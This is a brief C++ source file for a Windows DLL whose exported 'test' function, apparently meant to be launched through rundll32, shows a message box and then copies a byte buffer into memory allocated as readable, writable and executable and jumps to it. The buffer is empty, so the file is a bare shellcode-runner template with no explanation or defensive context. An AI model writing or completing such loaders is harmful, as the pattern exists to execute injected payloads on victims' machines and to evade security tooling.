#include <windows.h>


extern "C" _declspec(dllexport) void _cdecl test(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow)
{
	MessageBox(NULL, L"_Title_", L"Hello", MB_OK);
	unsigned char buf[] ="";


	void *exec = VirtualAlloc(0, sizeof buf, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	memcpy(exec, buf, sizeof buf);
	((void(*)())exec)();
	return;
}